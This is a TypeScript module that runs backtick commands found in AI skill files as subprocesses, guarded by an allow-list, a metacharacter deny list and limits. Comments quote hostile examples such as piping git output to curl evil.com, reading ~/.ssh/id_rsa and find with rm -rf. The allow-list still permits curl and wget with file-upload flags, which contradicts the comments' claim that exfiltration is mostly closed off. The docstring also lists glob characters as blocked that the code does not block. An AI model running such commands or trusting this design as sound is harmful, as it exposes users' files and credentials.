/**
 * ArisSkillsShellExpansion — resolve `` `command` `` substrings in
 * skill bodies (and frontmatter strings) by spawning each as a
 * subprocess and substituting stdout.
 *
 * Powers the "live data" pattern from the skills spec: an author
 * can drop `` `git rev-parse --abbrev-ref HEAD` `` into their skill
 * and have it expanded to the current branch at every dispatch,
 * without writing a tool call. Same idea as Claude Code's frontmatter
 * shell substitution.
 *
 * --- Security model -------------------------------------------------
 *
 * Skills can be authored by the user OR checked into a teammate's
 * project (`.aris/skills/`). Combining "shell execution at dispatch"
 * with "the model autonomously decides when to invoke a skill"
 * creates a textbook RCE-via-untrusted-content surface, so this
 * module is paranoid by design:
 *
 *   1. Off by default. The caller passes `enabled: false` from the
 *      server settings unless the user has explicitly turned the
 *      feature on. With it off, backtick substrings render verbatim;
 *      no subprocesses are spawned.
 *
 *   2. Allow-listed first token. The command's argv[0] (after
 *      whitespace tokenization) must be in `DEFAULT_ALLOWED_COMMANDS`.
 *      This is read-only-diagnostic-leaning by intent: `git`, `ls`,
 *      `cat`, `grep`, `curl`, etc. Mutating commands (`rm`, `mv`,
 *      `chmod`), privileged commands (`sudo`), and shell built-ins
 *      that take arbitrary code (`eval`, `exec`, `source`) are
 *      blocked.
 *
 *   3. No shell metacharacters. Pipes, redirects, command
 *      substitution, semicolons, backgrounding, env-var expansion —
 *      ALL refused before we ever spawn anything. We never invoke a
 *      shell; we tokenize on whitespace (with quote awareness) and
 *      pass argv directly to spawn(). This shuts the door on entire
 *      classes of attack: `find . -exec rm -rf {} \;` doesn't even
 *      reach the spawn call.
 *
 *   4. Spawned with `shell: false`. Confirms (3) at the OS level —
 *      Node's `child_process.spawn` only invokes a shell when
 *      explicitly asked. With `shell: false` and an argv list,
 *      Node calls execvp directly. Argv items don't get re-parsed,
 *      so `>` in a value isn't a redirect, it's a literal `>`.
 *
 *   5. Hard time limit (5s) and output cap (4KB). Prevents accidental
 *      DoS: `cat /dev/zero` gets killed at 5s, output truncated.
 *      Both limits are non-negotiable and capped at module level —
 *      not configurable per call.
 *
 *   6. Pinned cwd. Commands run in the project's cwd, never in $HOME
 *      or `/`. The caller passes the cwd; this module won't try to
 *      derive one from arbitrary user input.
 *
 *   7. Errors are graceful. Allow-list violation, metachar rejection,
 *      timeout, nonzero exit, spawn failure — every path returns a
 *      `[error: <reason>]` placeholder in the substitution, NOT an
 *      exception. A single bad command can't derail the whole skill
 *      dispatch. The error string surfaces in the rendered body so
 *      the author can see what went wrong.
 *
 * --- What this module is NOT ---------------------------------------
 *
 *   - Not a sandbox. The subprocess inherits the user's filesystem
 *     permissions. `cat ~/.ssh/id_rsa` works (and would, for any
 *     read-only command in the allow-list). The mitigation is that
 *     user-authored skills run as the user already; teammates'
 *     skills are gated behind the off-by-default flag.
 *
 *   - Not a security boundary against a determined local attacker
 *     who can edit settings. If someone can flip `allowShellExpansion`
 *     to true AND drop a malicious skill, they can already write
 *     ~/.bashrc anyway. We're protecting against the
 *     "clone-and-run" surface, not the local-shell-attacker surface.
 *
 * @module ArisSkillsShellExpansion
 */
import { spawn } from "node:child_process";

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

export interface ShellExpansionOptions {
  /**
   * Master switch. When `false`, backtick substrings render verbatim
   * (no spawn, no error, just literal text). Default-off in the
   * server settings; user must opt in.
   */
  readonly enabled: boolean;
  /**
   * Working directory for spawned commands. Hard-pinned per call;
   * commands cannot `cd` out of it (no shell, no metachars). Caller
   * typically passes the project's cwd.
   */
  readonly cwd: string;
  /**
   * Override the default allow-list. Pass `undefined` to use the
   * module-level `DEFAULT_ALLOWED_COMMANDS`. Pass an explicit list
   * (or empty Set) to restrict / extend. Items are matched
   * case-sensitively against argv[0]'s basename.
   */
  readonly allowedCommands?: ReadonlySet<string>;
}

export interface ShellExpansionResult {
  readonly text: string;
  /**
   * Per-substitution diagnostics. Empty when nothing was attempted
   * (feature disabled or no backticks present), or when every
   * substitution succeeded. One entry per failed `` `cmd` ``.
   */
  readonly errors: ReadonlyArray<ShellExpansionError>;
}

export interface ShellExpansionError {
  /** The original command string (between the backticks). */
  readonly command: string;
  /** Human-readable reason. Mirrors the `[error: ...]` placeholder text. */
  readonly reason: string;
}

// ---------------------------------------------------------------------------
// Allow-list + denied-metachar table
// ---------------------------------------------------------------------------

/**
 * Default allow-list. Read-only-diagnostic-leaning. Items match
 * argv[0]'s basename (so `/usr/local/bin/git` and `git` both pass).
 *
 * Curated for the realistic skill-authoring use cases: introspect
 * the repo, the system, and external read-only APIs. The actively
 * destructive / privileged tools are NOT here on purpose; see the
 * security model in the module docstring.
 */
export const DEFAULT_ALLOWED_COMMANDS: ReadonlySet<string> = new Set([
  // Repo / version control
  "git",
  // Filesystem inspection (read-only)
  "ls",
  "pwd",
  "dirname",
  "basename",
  "realpath",
  "stat",
  "find",
  // System info
  "date",
  "whoami",
  "uname",
  "hostname",
  // Text emission / processing
  "cat",
  "echo",
  "printf",
  "wc",
  "head",
  "tail",
  "grep",
  "awk",
  "sed",
  "jq",
  // Disk / shell discovery
  "df",
  "du",
  "which",
  // Network read (used for external-API fetches in skills — see
  // security model: metachar blocking + execvp closes most exfil
  // paths, so the residual risk is "skill author hardcoded a static
  // URL", which is a problem they could create with a tool call too).
  "curl",
  "wget",
]);

/**
 * Characters that must not appear ANYWHERE inside a backtick command.
 * If even one is present, we refuse to spawn — no shell-metachar
 * gymnastics, period.
 *
 * `$` blocks env-var expansion (`$HOME`) and command substitution
 * (`$(...)`). `\`` blocks nested backticks. `|` and `<>` block
 * pipes/redirects. `;` and `&` block command chaining. `*`, `?`, `[`,
 * `]` block glob expansion (we don't have a shell to expand them, so
 * literal use is harmless, but the absence makes intent unambiguous —
 * authors shouldn't write commands that would only work under a
 * shell). `\\` blocks escape sequences.
 */
const DENIED_METACHARS = new Set(["|", "<", ">", ";", "&", "$", "`", "\\", "\n", "\r"]);

/** Substring patterns rejected even when no individual char is denied. */
const DENIED_PATTERNS: ReadonlyArray<string> = ["-exec"];

// ---------------------------------------------------------------------------
// Tokenizer (quote-aware whitespace split)
// ---------------------------------------------------------------------------

/**
 * Split a command string into argv. Whitespace separates; single
 * and double quotes group tokens that contain spaces. Inside a
 * quoted region, the other quote char is literal. No backslash
 * escapes (those are blocked by the metachar filter anyway).
 *
 * Returns `null` if the quoted regions don't balance, so the caller
 * can refuse the whole substitution rather than silently truncate.
 */
function tokenize(command: string): string[] | null {
  const tokens: string[] = [];
  let buf = "";
  let inQuote: '"' | "'" | null = null;
  for (const ch of command) {
    if (inQuote) {
      if (ch === inQuote) {
        inQuote = null;
        continue;
      }
      buf += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      inQuote = ch;
      continue;
    }
    if (/\s/.test(ch)) {
      if (buf) {
        tokens.push(buf);
        buf = "";
      }
      continue;
    }
    buf += ch;
  }
  if (inQuote) return null;
  if (buf) tokens.push(buf);
  return tokens;
}

function basenameOf(path: string): string {
  const slash = Math.max(path.lastIndexOf("/"), path.lastIndexOf("\\"));
  return slash === -1 ? path : path.slice(slash + 1);
}

// ---------------------------------------------------------------------------
// Validation
// ---------------------------------------------------------------------------

interface ValidationResult {
  readonly ok: boolean;
  readonly reason?: string;
  readonly argv?: ReadonlyArray<string>;
}

function validateCommand(command: string, allowed: ReadonlySet<string>): ValidationResult {
  // Metachar gate FIRST — even an allowed command can't have shell
  // metacharacters. We don't want `git log | curl evil.com` to slip
  // through because `git` is allowed.
  for (const ch of command) {
    if (DENIED_METACHARS.has(ch)) {
      return { ok: false, reason: `metacharacter not allowed: '${ch}'` };
    }
  }
  for (const pattern of DENIED_PATTERNS) {
    if (command.includes(pattern)) {
      return { ok: false, reason: `denied pattern: '${pattern}'` };
    }
  }

  const tokens = tokenize(command);
  if (!tokens) return { ok: false, reason: "unbalanced quotes" };
  if (tokens.length === 0) return { ok: false, reason: "empty command" };

  const argv0 = tokens[0]!;
  const cmd = basenameOf(argv0);
  if (!allowed.has(cmd)) {
    return { ok: false, reason: `command '${cmd}' is not in the allow-list` };
  }
  return { ok: true, argv: tokens };
}

// ---------------------------------------------------------------------------
// Subprocess execution
// ---------------------------------------------------------------------------

/**
 * Hard module-level limits. Not configurable per call — paranoid
 * defaults are the point. Bumping these requires editing this file
 * and reasoning about whether the new value is still safe.
 */
const TIMEOUT_MS = 5000;
const OUTPUT_CAP_BYTES = 4096;

interface SpawnResult {
  readonly stdout: string;
  readonly truncated: boolean;
  readonly exitCode: number | null;
  readonly timedOut: boolean;
  readonly spawnError: string | null;
}

function runCommand(argv: ReadonlyArray<string>, cwd: string): Promise<SpawnResult> {
  return new Promise((resolve) => {
    let buffered = Buffer.alloc(0);
    let truncated = false;
    let timedOut = false;

    const child = spawn(argv[0]!, argv.slice(1), {
      cwd,
      // Critical: shell=false means no bash interpretation. argv items
      // are passed to execvp directly. If shell:true ever creeps in
      // here, the entire metachar-blocking scheme becomes ornamental.
      shell: false,
      stdio: ["ignore", "pipe", "pipe"],
    });

    const killTimer = setTimeout(() => {
      timedOut = true;
      child.kill("SIGKILL");
    }, TIMEOUT_MS);

    const append = (chunk: Buffer): void => {
      if (buffered.length >= OUTPUT_CAP_BYTES) {
        truncated = true;
        return;
      }
      const room = OUTPUT_CAP_BYTES - buffered.length;
      if (chunk.length > room) {
        buffered = Buffer.concat([buffered, chunk.subarray(0, room)]);
        truncated = true;
      } else {
        buffered = Buffer.concat([buffered, chunk]);
      }
    };

    child.stdout?.on("data", append);
    // We capture stderr too so failures are diagnosable, but only when
    // there's headroom under the cap. Stdout takes priority.
    child.stderr?.on("data", append);

    child.on("error", (err) => {
      clearTimeout(killTimer);
      resolve({
        stdout: buffered.toString("utf8"),
        truncated,
        exitCode: null,
        timedOut: false,
        spawnError: err.message,
      });
    });

    child.on("close", (code) => {
      clearTimeout(killTimer);
      resolve({
        stdout: buffered.toString("utf8"),
        truncated,
        exitCode: code,
        timedOut,
        spawnError: null,
      });
    });
  });
}

// ---------------------------------------------------------------------------
// Public entry: expand a body string
// ---------------------------------------------------------------------------

const BACKTICK_PATTERN = /`([^`\n]+)`/g;

/**
 * Replace each `` `command` `` substring in `text` with the live
 * stdout of running `command`, subject to the security checks
 * documented at the top of this module. Returns the rewritten
 * string + any per-substitution errors.
 *
 * Backticks span a single line by intent — multi-line commands
 * would invite all the metachar headaches we just locked out.
 * Authors who want multi-line workflows should use a regular tool
 * call (bash) inside the skill, not frontmatter expansion.
 */
export async function expandShellSubstitutions(
  text: string,
  options: ShellExpansionOptions,
): Promise<ShellExpansionResult> {
  if (!options.enabled) {
    return { text, errors: [] };
  }

  const allowed = options.allowedCommands ?? DEFAULT_ALLOWED_COMMANDS;
  const errors: ShellExpansionError[] = [];

  // Collect matches first so we can run substitutions in order without
  // index-walking the string while it's being rewritten.
  const matches: Array<{ start: number; end: number; command: string }> = [];
  for (const m of text.matchAll(BACKTICK_PATTERN)) {
    if (m.index === undefined) continue;
    matches.push({
      start: m.index,
      end: m.index + m[0].length,
      command: m[1]!,
    });
  }
  if (matches.length === 0) return { text, errors: [] };

  // Resolve each match. Run sequentially rather than in parallel: the
  // common case is 1–3 backticks per skill, and serial execution makes
  // the timeout budget predictable (one slow command can't block
  // others' wall-clock budget). For high-cardinality skills this could
  // be relaxed to bounded concurrency, but that's premature.
  const replacements: string[] = [];
  for (const match of matches) {
    const validation = validateCommand(match.command, allowed);
    if (!validation.ok || !validation.argv) {
      const reason = validation.reason ?? "validation failed";
      errors.push({ command: match.command, reason });
      replacements.push(`[error: ${reason}]`);
      continue;
    }

    let spawnResult: SpawnResult;
    try {
      spawnResult = await runCommand(validation.argv, options.cwd);
    } catch (err) {
      const reason = err instanceof Error ? err.message : String(err);
      errors.push({ command: match.command, reason });
      replacements.push(`[error: ${reason}]`);
      continue;
    }

    if (spawnResult.spawnError) {
      const reason = `spawn failed: ${spawnResult.spawnError}`;
      errors.push({ command: match.command, reason });
      replacements.push(`[error: ${reason}]`);
      continue;
    }
    if (spawnResult.timedOut) {
      const reason = `timed out after ${TIMEOUT_MS}ms`;
      errors.push({ command: match.command, reason });
      replacements.push(`[error: ${reason}]`);
      continue;
    }
    if (spawnResult.exitCode !== 0) {
      const reason = `exited with code ${spawnResult.exitCode}`;
      errors.push({ command: match.command, reason });
      replacements.push(`[error: ${reason}]`);
      continue;
    }

    let out = spawnResult.stdout.trim();
    if (spawnResult.truncated) {
      out += " […truncated]";
    }
    replacements.push(out);
  }

  // Splice in the replacements right-to-left so earlier indices stay
  // valid as we go. Then reverse the result back into normal order.
  let result = text;
  for (let i = matches.length - 1; i >= 0; i -= 1) {
    const match = matches[i]!;
    const replacement = replacements[i]!;
    result = result.slice(0, match.start) + replacement + result.slice(match.end);
  }

  return { text: result, errors };
}
